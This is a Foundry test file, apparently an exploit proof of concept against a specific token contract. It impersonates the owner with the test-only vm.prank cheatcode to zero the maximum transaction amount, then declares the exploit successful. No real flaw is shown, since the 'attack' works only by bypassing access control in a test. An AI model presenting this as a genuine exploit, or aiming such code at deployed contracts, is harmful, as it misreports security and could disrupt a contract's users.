pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FLOV {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxAmount) external;
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCA1E6F584E0d7EEc74F553E9a7B64a4DeD8A4b61;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = FLOV(TARGET).owner();

        // Impersonate the owner and set maxTxAmount to 0
        vm.prank(owner);
        FLOV(TARGET).setMaxTxPercent(0);

        // Verify the exploit worked
        uint256 maxTxAmount = FLOV(TARGET)._maxTxAmount();
        require(maxTxAmount == 0, "Exploit failed: _maxTxAmount not set to 0");
        assertEq(FLOV(0xCA1E6F584E0d7EEc74F553E9a7B64a4DeD8A4b61)._maxTxAmount(), 0, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

